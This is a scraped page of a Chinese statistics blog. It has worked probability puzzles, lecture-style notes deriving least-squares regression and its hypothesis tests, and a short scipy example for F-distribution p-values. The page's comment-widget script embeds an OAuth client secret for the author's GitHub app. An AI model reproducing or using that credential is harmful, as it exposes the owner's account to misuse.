<h1 id="囚犯的抉择"><a href="#囚犯的抉择" class="headerlink" title="囚犯的抉择"></a>囚犯的抉择</h1><p>A,B,C三位申请假释的囚犯，有着同样良好的记录。假释委员会通过了其中2位囚犯的申请，但是囚犯们还不知道是他们3人中的哪2位。囚犯A有个预警朋友知道谁将被允许假释。囚犯A觉得不太好意思直接问自己是否被释放，于是他想问B和C是否被释放。他认为他现在被释放的概率是2/3，一旦预警回答”B将被释放”，那么它自己被释放的概率就变成了1/2。因此A打消了问预警的念头，他害怕自己被释放的概率减小。这种想法显然是错误的，请问错在哪？<br>他的样本空间考虑错了<br>谁被释放这是一个事件m：A,B,C被释放的情况有AB, AC, BC三种情况，<br>再考虑另一个事件n：预警回答B或C, (A只询问预警B和C的情况)<br>根据贝叶斯公式，当预警说B被释放时，A被释放的后验概率为<br>
$$\begin{eqnarray}
P(m=AB│n=B) &=& \frac{P(m=AB,n=B)}{P(n=B)} \\
&=& \frac{P(m=AB) \times P(n=B│m=AB)}{P(m=AB)\times P(n=B│m=AB)+P(m=BC) \times P(n=B│m=BC)} \\
&=& \frac{{1 \over 3} \times 1}{{1 \over 3} \times 1+{1 \over 3} \times {1 \over 2}} \\
&=& {2 \over 3}
\end{eqnarray}$$
</p>
<h1 id="收集优惠券"><a href="#收集优惠券" class="headerlink" title="收集优惠券"></a>收集优惠券</h1><p>麦片盒中的优惠券有1至5号，每盒麦片里都有一张优惠券，获得每种优惠券的机会均等，集齐这5种优惠券可以得到一个奖励，平均买多少盒麦片可以集齐一套优惠券？</p>
<p>这跟做多少次实验首次成功差不多，可以把这个问题看作五段伯努利过程，每一段的参数不一样：</p>
<ol>
<li>第一段伯努利过程中，获得所需优惠券的概率为1，因此只需买1盒；</li>
<li>第二段伯努利过程，因为已经得到一种优惠券了，我想要的优惠券变为剩下的四种，所以获得所需优惠券的概率为4/5，伯努利过程中首次成功的实验次数服从参数为p几何分布, 其分布列为<br>$$P(k) = p(1-p)^{k-1}, k=1,2,…$$ 几何分布的期望为1/p,因此获得第二种所需优惠券需要买1/p=1/(4/5)=5/4=1.25盒;</li>
<li>第三段伯努利过程中获得所需优惠券的概率为3/5，需要买5/3=1.67盒;</li>
<li>第四段伯努利过程中获得所需优惠券的概率为2/5，需要买5/2=2.5盒;</li>
<li>第五段伯努利过程中获得所需优惠券的概率为1/5，需要买5/1=5盒;</li>
</ol>
<p>至此收集完5中优惠券平均共需买麦片<br>1+1.25+1.67+2.5+5= 11.42盒</p>
<h1 id="音乐会的一排座位"><a href="#音乐会的一排座位" class="headerlink" title="音乐会的一排座位"></a>音乐会的一排座位</h1><p>8位单身汉和7位美丽的模特随机坐在音乐会中一排座位中的任意位置。平均出现几对男女邻座？<br>1对邻座刚好坐着一对男女的情况为“男女”或“女男” ，发生的概率是<br>8/15×7/14+7/15×8/14=8/15<br>也就是说，1对邻座平均坐着1×8/15+0×(1-8/15)=8/15对男女。15个座位共有14对邻座，根据和的期望等于期望的和，14对邻座中男女对数的期望等于1对邻座的男女对数期望的14倍。因此15个座位产生的男女对数为14*8/15=7.4667对</p>
<h1 id="第二好能成为亚军吗？"><a href="#第二好能成为亚军吗？" class="headerlink" title="第二好能成为亚军吗？"></a>第二好能成为亚军吗？</h1><p>8位运动员参加网球比赛，赛程如下图<br> <img src="http://img.blog.csdn.net/20170510131306805?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>假设每场比赛的胜负只有运动员的水平决定。最好的运动员一定获得冠军，那么第二好的运动员获得亚军的概率是多少？<br>4/7，第二好的运动员要获得亚军必须在finals才与第一好相遇，那么他在第一轮要被分在和第一好不同的另一半边。第一好占了一个位置，所以是4/7</p>
<h1 id="双胞胎骑士"><a href="#双胞胎骑士" class="headerlink" title="双胞胎骑士"></a>双胞胎骑士</h1><p>（a）亚瑟王举办Jousting比赛（两个骑士拿着长矛对冲），8位骑士参加，包括双胞胎Balin和Balan，依然按照16题中的赛程比赛，求他俩在比赛中相遇的概率?<br>这里不知道各个骑士水平谁好谁坏，只能假设每个骑士赢的概率都是1/2.<br>假设双胞胎中的一位被分在某个位置，不妨设为1，另一位和他在同一小组（如位置2）的概率为1/7, 而此时相遇大概率为1；<br>另一位和他在相邻的小组（如位置3或4）的概率为2/7, 而此时相遇大概率为1/4；<br>另一位在另一半大组（如位置5,6,7,8）的概率为4/7, 而此时相遇大概率为1/16；<br>因此他两相遇的概率为<br>$${1 \over7 } \cdot 1+{2 \over 7} \cdot {1 \over 4}+{4 \over 7} \cdot {1 \over 16}={1 \over 4}$$<br>（b）将(a)中的8改为$2^n$?</p>
<table>
<thead>
<tr>
<th>n</th>
<th>p</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>1/2</td>
</tr>
<tr>
<td>3</td>
<td>1/4</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>n</td>
<td>1/$2^{n-1}$</td>
</tr>
</tbody>
</table>
<p>或者:<br>$2^n$中的n表示要比赛n轮，若1人被随机分到这一大半边，另一人被分到另一大半边的概率为${2^{n-1} \over 2^n-1}$，其中一人杀到第n轮的概率为${1\over 2^{n-1}}$ ，两人都杀到第n轮的概率为${1\over 2^{n-1}}\cdot {1\over 2^{n-1}}={1\over 2^{2(n-1)}}$，所以两人在第$n$轮相遇的概率为<br>$$\frac{2^{n-1}}{2^n-1}\cdot \frac{1}{2^{2(n-1)}}$$<br>两人在第$i$轮相遇的概率为<br>$$\frac{2^{i-1}}{2^n-1}\cdot \frac{1}{2^{2(i-1)}}$$<br>相遇的总概率为第$1,2,3,…,n$轮相遇的概率之和<br> $$\begin{aligned}<br> \sum<em>{i=1}^n\frac{2^{i-1}}{2^n-1}\cdot \frac{1}{2^{2(i-1)}}<br>=\frac{1}{2^n-1}\sum</em>{i=1}^n\frac{1}{2^{i-1}}<br>=\frac{2}{2^n-1}\sum_{i=1}^n\frac{1}{2^i}<br>=\frac{2}{2^n-1}(1-\frac{1}{2^n})=\frac{1}{2^{n-1}}<br>\end{aligned}$$</p>
<h1 id="抛均匀的硬币"><a href="#抛均匀的硬币" class="headerlink" title="抛均匀的硬币"></a>抛均匀的硬币</h1><p>抛100次硬币，正好50次正面朝上的概率？<br>很简单，二项分布<br>$$p=\binom{100}{50}({1\over2})^{100}=\frac{100!}{50!50!}({1\over2})^{100}$$<br>难点是没有计算器怎么办？<br>根据斯特林公式（Stirling’s approximation）<br>$$n! \approx \sqrt{2\pi}n^{n+{1\over2}}e^{-n}$$<br>有时也能简便一点</p>
<h1 id="艾萨克·牛顿帮助塞缪尔·佩皮斯"><a href="#艾萨克·牛顿帮助塞缪尔·佩皮斯" class="headerlink" title="艾萨克·牛顿帮助塞缪尔·佩皮斯"></a>艾萨克·牛顿帮助塞缪尔·佩皮斯</h1><p>佩皮斯写信给牛顿问下面那件事是最可能发生的<br>（a）    掷6个骰子，至少得到1个6<br>（b）    掷12个骰子，至少得到2个6<br>（c）    掷18个骰子，至少得到3个6<br><img src="http://img.blog.csdn.net/20170528153307598?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h1 id="三角决斗"><a href="#三角决斗" class="headerlink" title="三角决斗"></a>三角决斗</h1><p>A，B和C玩三角手枪决斗。 所有人都知道，A的命中率是0.3，C是0.5，B不会失误。 他们将按照A，B，C循环的顺序自由选择目标决斗，直到最后一个人活下来。A的策略应该是什么？<br> <img src="http://img.blog.csdn.net/20170528163254932?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>如上图，若A先射C, A赢的概率是0.21，若A先射击B, A赢的概率将大于0.21. 因此A应先射B。此时的局面是AC互射，A赢的情况只可能为C一直射不中A, 而A在最后一次射击时射中了C, 因此A赢的概率为<br>C射1次A没射中, A第1次射就射死C:  $0.5 \times 0.3 +$<br>C射2次A没射中, A第2次射才射死C:  $0.5^2 \times 0.7 \times 0.3+$<br>C射3次A没射中, A第3次射才射死C:  $0.5^3 \times 0.7^2 \times 0.3 +$<br>C射4次A没射中, A第4次射才射死C:  $0.5^4 \times 0.7^3 \times 0.3 + $<br>…<br>这是个无穷递减等比数列求和，比值为0.5x0.7=0.35<br>$0.5 \times 0.3 \times (1+0.5 \times 0.7+(0.5 \times 0.7)^2+(0.5 \times 0.7)^3+…)=0.5 \times 0.3 \times \frac{1}{1-0.35}=3/13$<br>因此，若A先射B, A赢的概率为$0.21+0.3 \times 3/13=0.279$.<br>起码A的生还几率大了近7个点</p>
<h1 id="放回抽样还是不放回抽样"><a href="#放回抽样还是不放回抽样" class="headerlink" title="放回抽样还是不放回抽样"></a>放回抽样还是不放回抽样</h1><p>两个装有红球和黑球的桶。A桶有2个红球和1个黑球，B桶有101个红球和100个黑球。桶被随机选择。在第一个球被取出并报告颜色后你可以决定它是否放回原来的桶中（当然你看不到是哪个桶），再从这个桶中取出第二个球（2个球来自同一个桶），你根据这2个球的颜色判断它们来自哪个桶，判断对了可获得奖励。</p>
<p>如果第一个取出的球是红色，被取出球的桶剩余的红球数与黑球数相等，这样不好做判断，因此最好放回；若第一个取出的球是黑色，被取出桶中的黑球更少了，有利于我们根据期望判断。<br>假设第1次取出红球，放回红球，再取出又是红球。<br>如果球来自A桶，这种情况发生的概率为1/2<em>2/3</em>2/3=0.222<br>如果球来自B桶，这种情况发生的概率为1/2<em>101/201</em>101/201=0.126<br>当球来自A桶，这种情况发生的概率大，因此我们推断球来自A桶<br>同样地有<br><img src="http://img.blog.csdn.net/20170531232638938?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/11/11/线性回归/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/11/11/线性回归/" itemprop="url">线性回归</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-11-11T17:13:00+08:00">
                2016-11-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="线性模型使用范围"><a href="#线性模型使用范围" class="headerlink" title="线性模型使用范围"></a>线性模型使用范围</h1><p>相比于非线性模型，线性模型更适用于：</p>
<ol>
<li>小数据集</li>
<li>低信噪比</li>
<li>稀疏数据</li>
</ol>
<h1 id="线性回归模型"><a href="#线性回归模型" class="headerlink" title="线性回归模型"></a>线性回归模型</h1><p>约定数据集$X=(X_1,X_2,...,X_p)$有p个特征，$X_j \in R^N$共N个样本。<br>$$f(X)=\beta_0+\sum_{i=1}^p X_j\beta_j$$</p>
<p>给X增加一列1，$X=(1, X_1,X_2,...,X_p)$， $\beta=(\beta_0, \beta_1, ..., \beta_p)^T$，上式可写成矩阵形式：<br>$$f(X)=X\beta$$</p>
<p>这里的$f(X)$为真实模型，$\beta$为真实模型参数，相对应的有估计模型和估计参数, 估计模型的结果为估计的响应变量y<br>$$\hat{y}=\hat{f}(X)=X\hat{\beta}$$</p>
<p>在统计学习里，我们一般认为真实的,即观测到的响应变量为估计与误差的叠加<br>$$y=\hat f(X)+\varepsilon=X \hat \beta+\varepsilon$$</p>
<p>这里$\varepsilon=(\varepsilon_0, \varepsilon_1,...,\varepsilon_N)^T$, 是每个样本预测值和真实值的误差组成的向量，假设它服从高斯分布<br>$$\varepsilon \sim N(0, \sigma^2I_N )$$</p>
<p>那么y也服从高斯分布<br>$$y \sim N(X\beta, \sigma^2I_N )$$</p>
<p>根据X的不同来源，线性模型的表达能力可以得到极大的扩展：</p>
<ul>
<li>定量输入</li>
<li>定量输入的变换，如log, 平方根，平方</li>
<li>基展开，如$X_2=X_1^2, X_3=X_1^3$</li>
<li>哑变量，类别变量做独热编码变成的由0，1组成的稀疏矩阵</li>
<li>交互项，如$X_3=X_1X_2$</li>
</ul>
<h1 id="最小二乘法"><a href="#最小二乘法" class="headerlink" title="最小二乘法"></a>最小二乘法</h1><h2 id="求解方法与理解"><a href="#求解方法与理解" class="headerlink" title="求解方法与理解"></a>求解方法与理解</h2><p>为了求得真实模型，我们希望y和$\hat{y}=X\hat \beta$的误差尽量小，因此需要求得使残差平方和$RSS(\beta)=(y-X\beta)^T(y-X\beta)$最小的模型参数$\beta$，这是无约束二次优化问题，直接求导即可<br>$$\frac{\partial RSS(\beta)}{\partial \beta}=-2X^T(y-X\beta)=0$$</p>
<p>$$X^TX\beta = X^Ty$$</p>
<p>当X列满秩时，若以y为未知数，方程组Xy=0中y只有0解，而这里y≠0，因此Xy≠0，所以$y^T(X^TX)y=(Xy)^T(Xy)&gt;0$，即$X^TX$正定，非奇异，则<br>$$\hat{\beta} = (X^TX)^{-1}X^Ty$$</p>
<p>其实，要使所求解为极小值点也必须满足<br>$$\frac{\partial ^2RSS(\beta)}{\partial \beta \partial \beta^T}=2X^TX&gt;0$$</p>
<p>因此X列满秩是必须满足的条件。下面只讨论X列满秩的情况。<br>那么<br>$$\hat{y} =X\hat{\beta}$$</p>
<p>可见，$\hat{y}$是X列向量的线性组合，$\hat{y} \in span<x_0, x_1,...,x_p="">$，所以<br>$$dim(\hat y)=p+1$$</x_0,></p>
<p>真实的$y=f(X)+\varepsilon$, 由于误差的存在，y不在X的列空间里边。所以，对于最小二乘法来说，最小化残差平方和$min||y-\hat{y}||^2$即找到一个$\hat y$使得$y-\hat y$正交于X的列空间。此时，$||y-\hat{y}||$取得最小值，放张图感受一下。<br><img src="http://img.blog.csdn.net/20161111093602494" alt="这里写图片描述"><br>根据维数公式，有<br>$$\begin{aligned}dim(y)<br>    &amp;=dim(\hat y) + dim(y-\hat y)-dim(\hat y\bigcap (y-\hat y))\<br>    &amp;=dim(\hat y) + dim(y-\hat y)\<br>    \end{aligned}$$</p>
<p>所以，$dim(y-\hat y) = dim(y)-dim(\hat y) = N-(p+1)$(求这个是为了后面求卡方分布的自由度)<br>那么，什么是回归？就是求y在X列空间的投影，所以我们说$\hat{y}$是y在X上的回归。而最小二乘法所做的就是找到这种正交映射。令$H=X(X^TX)^{-1}X^T$<br>$$\hat{y} =X\hat{\beta}=X(X^TX)^{-1}X^Ty=Hy$$</p>
<p>H就是这个投影矩阵。</p>
<h2 id="hat-beta-的期望与方差"><a href="#hat-beta-的期望与方差" class="headerlink" title="$\hat \beta$的期望与方差"></a>$\hat \beta$的期望与方差</h2><p>我们估计的$\hat{\beta}$与真实的$\beta$差别有多大呢？<br>
$$\begin{aligned}E_{Y|X}(\hat{\beta})
	&=E_{Y|X}((X^TX)^{-1}X^Ty)\\
	&=(X^TX)^{-1}X^TE_{Y|X}(y)\\
	&=(X^TX)^{-1}X^TX\beta\\
	&=\beta
	\end{aligned}$$
</p>
<p>可见，用最小二乘法所估计出来的模型参数是无偏估计。<br>
$$\begin{aligned}Var_{Y|X}(\hat \beta)
		&=E_{Y|X}[(\hat{\beta}-E_{Y|X}(\hat{\beta}))(\hat{\beta}-E_{Y|X}(\hat{\beta}))^T]\\
		&=E_{Y|X}[((X^TX)^{-1}X^T\varepsilon)((X^TX)^{-1}X^T\varepsilon)^T]\\
		&=E_{Y|X}[(X^TX)^{-1}X^T\varepsilon \varepsilon^TX(X^TX)^{-1}]\\
		&=(X^TX)^{-1}X^TE_{Y|X}(\varepsilon \varepsilon^T)X(X^TX)^{-1}\\
		&=(X^TX)^{-1}X^TX(X^TX)^{-1}E(\varepsilon \varepsilon^T)\\
		&=(X^TX)^{-1}E(\varepsilon \varepsilon^T)\\
		&=(X^TX)^{-1}[E(\varepsilon \varepsilon^T)-0]\\
		&=(X^TX)^{-1}[E(\varepsilon \varepsilon^T)-E^2(\varepsilon)]\\
		&=(X^TX)^{-1}Var(\varepsilon)\\
		&=(X^TX)^{-1}\sigma^2I_N\\
	\end{aligned}$$
</p>
<p>其中<br>
$$\begin{aligned}\hat{\beta}-E_{Y|X}(\hat{\beta})
	&=(X^TX)^{-1}X^Ty-\beta\\
	&=(X^TX)^{-1}X^Ty-(X^TX)^{-1}X^TX\beta\\
	&=(X^TX)^{-1}X^T(y-X\beta)\\
	&=(X^TX)^{-1}X^T\varepsilon\\
	\end{aligned}$$
</p>
<p>另外，如果我们能估计出$\sigma$，那么也就能估计出$Var(\hat \beta)$, 也就能求出$\hat \beta$的置信区间了。<br>我们知道，误差服从高斯分布<br>$$y-\hat y \sim N(0, \sigma^2I_N)$$</p>
$$\frac{y-\hat y}{\sigma} \sim N(0, I_N)$$
$$\frac{||y-\hat y||^2}{\sigma^2} \sim \chi^2_{dim(y-\hat y)}=\chi^2_{N-p-1}$$
$$||y-\hat y||^2 \sim \sigma^2 \chi^2_{N-p-1}$$
<p>残差平方和服从自由度为N-p-1的卡方分布(一个高斯分布的平方自然是$\chi ^ 2$分布了)，所以有<br>$$E||y-\hat y||^2 = (N-p-1)\sigma^2 $$</p>
<p> 则</p>
<p>$$\sigma^2 = \frac{1}{N-p-1}E||y-\hat y||^2$$</p>
$$\hat \sigma^2 = \frac{1}{N-p-1}\sum_{i=1}^N(y_i-\hat y_i)^2$$
<p>可证明，上面的$\hat \sigma$是$\sigma$的无偏估计。因此<br>$$E(\hat \beta)=\beta$$</p>
$$Var(\hat \beta)=(X^TX)^{-1}\hat \sigma^2I_N$$
<h2 id="的假设检验"><a href="#的假设检验" class="headerlink" title="的假设检验"></a>$\hat \beta_j$的假设检验</h2><h3 id="单个的假设检验"><a href="#单个的假设检验" class="headerlink" title="单个的假设检验"></a>单个$\hat \beta_j$的假设检验</h3><p>由$\hat{\beta} = (X^TX)^{-1}X^Ty$，以及y服从高斯分布可知，$\hat{\beta}$也服从高斯分布<br>$$\hat{\beta} \sim N(\beta, (X^TX)^{-1}\hat \sigma^2I_N)$$</p>
<p>写成分量形式，对于 j=1,2,…,N,<br>$$\hat{\beta_j} \sim N(\beta_j, v_{jj} \hat \sigma^2)$$</p>
<p>其中，$v_{jj}$为$(X^TX)^{-1}$的第j个对角元，$v_{jj} \hat \sigma^2$是$\hat{\beta_j}$的方差，其标准差应为$\sqrt{v_{jj}} \hat \sigma$。不过，我们不知道是否有$v_{jj} > 0$</p>
<p>设$u \in R^{p+1}$列向量，构造$w=(X^TX)^{-1}u$，也是p+1维列向量，自然有$u=X^TXw$，因此<br>
$$\begin{aligned}u^T(X^TX)^{-1}u
	&=(X^TXw)^T(X^TX)^{-1}X^TXw \\
	&=w^TX^TX(X^TX)^{-1}X^TXw \\
	&=w^TX^TXw \\
	&=(Xw)^T(Xw) \geq0
	\end{aligned}$$
<br>显然，只有当u=0时，才有w=0,进而才恒有$u^T(X^TX)^{-1}u=0$, 因此$(X^TX)^{-1}$正定，故$v_{jj}>0$，此时我们可以写出参数$\hat \beta_j$的z分数了。<br>$$z=\frac{\hat \beta_j}{std(\hat \beta_j)}=\frac{\hat \beta_j}{ \sqrt{v_{jj}}\hat \sigma} \sim t_{N-p-1}$$</p>
<p>在原假设$\hat \beta_j=0$下，z服从自由度为N-p-1的t分布(一个高斯分布除以一个$\chi ^ 2$分布的平方根，自然是t分布了)，绝对值大的z分数，其对应的p值(可以查t分布表)也就越小，越可以拒绝原假设，即$\hat \beta_j>0$，相应的特征$X_j$应该被保留。<br>当N足够大时，t分布近似于高斯分布，t分布的尾分数与高斯分布的尾分数几乎相等，因此也可认为z服从高斯分布。这是一般的假设检验过程，这里不详述了。</p>
<h3 id="多个的假设检验"><a href="#多个的假设检验" class="headerlink" title="多个的假设检验"></a>多个$\hat \beta_j$的假设检验</h3><p>F统计量可检验一组系数是否可置0,<br>$$F=\frac{(RSS_0-RSS_1)/(p_1-p_0)}{RSS_1/(N-p_1-1)}$$</p>
<p>其中$RSS_1$是用较大模型(参数多)算出来的残差平方和，$p_1$是该模型的参数数量(特征维数)，$RSS_0$是较小模型的残差平方和，$p_0$是该模型的参数数量(特征维数)。在高斯假设下，设较小模型更正确为零假设下，F统计量服从$F_{p_1-p_0, N-p_1-1}$分布，可查表得到相应p值以判断是否拒绝原假设，即较小模型是否更好。</p>
<h2 id="的置信区间"><a href="#的置信区间" class="headerlink" title="的置信区间"></a>$\hat \beta_j$的置信区间</h2><p>上面提到参数$\hat \beta_j$的z分数<br>$$z=\frac{\hat \beta_j}{ \sqrt{v_{jj}\hat \sigma^2}} \sim t_{N-p-1}$$</p>
<p>z服从自由度为N-p-1的t分布，那么z的$1-\alpha$置信区间为<br>$$(-z^{1-{\alpha \over 2}}, z^{1-{\alpha \over 2}})$$</p>
<p>因此真实模型参数$\beta_j$的$1-\alpha$置信区间为<br>$$(\hat \beta_j-z^{1-{\alpha \over 2}}v_{jj}^{1 \over 2}\hat \sigma, \hat \beta_j+z^{1-{\alpha \over 2}}v_{jj}^{1 \over 2}\hat \sigma)$$</p>
<p>其中$z^{1-{\alpha \over 2}}$可通过查表得到。比如我想要个95%置信区间<br>$$\alpha=1-0.95=0.05$$</p>
<p>$$1-{\alpha \over 2}=1-0.025=0.975$$</p>
<p>若样本较多，N很大，可查标准正太分布表有<br>$$z^{1-{\alpha \over 2}}=z^{0.975}=1.96$$</p>
<p>所以$\beta_j$的95%置信区间为<br>$$(\hat \beta_j-1.96v_{jj}^{1 \over 2}\hat \sigma, \hat \beta_j+1.96v_{jj}^{1 \over 2}\hat \sigma)$$</p>
<hr>
<p>总结自The Elements of Statistical Learning</p>
<p><div id="container"></div></p>
<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
var gitment = new Gitment({
  id: 'linear_regression',
  title: '线性回归',
  owner: 'yiyang186',
  repo: 'blog_comment',
  oauth: {
    client_id: '2786ddc8538588bfc0c8',
    client_secret: '83713f049f4b7296d27fe579a30cdfe9e2e45215',
  },
})
gitment.render('container')
</script>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/10/06/怎样用scipy求一些统计量的p值和分位数/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/10/06/怎样用scipy求一些统计量的p值和分位数/" itemprop="url">怎样用scipy求一些统计量的p值和分位数</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-10-06T11:05:00+08:00">
                2016-10-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/操作/" itemprop="url" rel="index">
                    <span itemprop="name">操作</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>scipy.stats模块中有不少涉及计算统计量的子模块<br>如<br>scipy.stats.uniform<br>scipy.stats.norm<br>scipy.stats.t<br>scipy.stats.chi2<br>scipy.stats.f<br>更多子模块参见<a href="http://docs.scipy.org/doc/scipy/reference/stats.html" target="_blank" rel="external">这里</a></p>
<p>其中scipy.stats.f内有如下方法：<br><img src="http://img.blog.csdn.net/20161006104131553" alt="图一"><br>来自于<a href="http://docs.scipy.org/doc/scipy/reference/generated/scipy.stats.f.html#scipy.stats.f" target="_blank" rel="external">这里</a></p>
<p>这些方法在其他子模块中都大同小异。这里重点介绍求F统计量的p值和分位数，t统计量，卡方，正态，的求法基本类似。</p>
<p>例1：求$Pr(F_{4,58}>1.67)=?$,即已知临界值求p值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; from scipy.stats import f</div><div class="line">&gt;&gt;&gt; f.sf(1.67, 4, 58)</div><div class="line">0.16927935111708425</div><div class="line">&gt;&gt;&gt; 1 - f.cdf(1.67, 4, 58)</div><div class="line">0.16927935111708448</div></pre></td></tr></table></figure></p>
<p>例2：求$F_{4,58}^{(1-0.17)}=?$ ,即已知p值求临界值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; from scipy.stats import f</div><div class="line">&gt;&gt;&gt; f.isf(0.17, 4, 58)</div><div class="line">1.666945416681088</div><div class="line">&gt;&gt;&gt; f.ppf(1 - 0.17, 4, 58)</div><div class="line">1.666945416681088</div></pre></td></tr></table></figure></p>
<p>其中，isf是sf的逆运算， ppf是cdf的逆运算。具体解释参见上图。其他统计量的相关计算方法与之类似，不同之处就是少了自由度作为参数。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/7233064.jpg"
               alt="Yiyang Peng" />
          <p class="site-author-name" itemprop="name">Yiyang Peng</p>
           
              <p class="site-description motion-element" itemprop="description">Try try try Never mind</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">30</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">5</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">32</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/yiyang186" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.zhihu.com/people/peng-yiyang-88" target="_blank" title="知乎">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  知乎
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
